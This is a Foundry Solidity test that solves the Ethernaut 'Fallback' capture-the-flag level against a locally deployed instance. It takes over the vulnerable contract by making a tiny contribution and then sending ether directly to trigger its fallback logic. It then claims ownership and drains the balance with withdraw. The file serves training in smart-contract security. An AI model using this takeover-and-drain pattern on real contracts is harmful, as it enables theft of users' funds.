pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Fallback } from "src/Fallback/Fallback.sol";
import { FallbackFactory } from "src/Fallback/FallbackFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
        vm.deal(me, 5 ether);
    }

    function testFallbackHack() external {
        // level setup
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackSC = Fallback(payable(levelAddress));

        // attack
        fallbackSC.contribute{value: 1 wei}();
        address(payable(fallbackSC)).call{value: 1 wei}(new bytes(0));
        assertEq(fallbackSC.owner(), me);

        fallbackSC.withdraw();
        assertEq(address(fallbackSC).balance, 0);

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
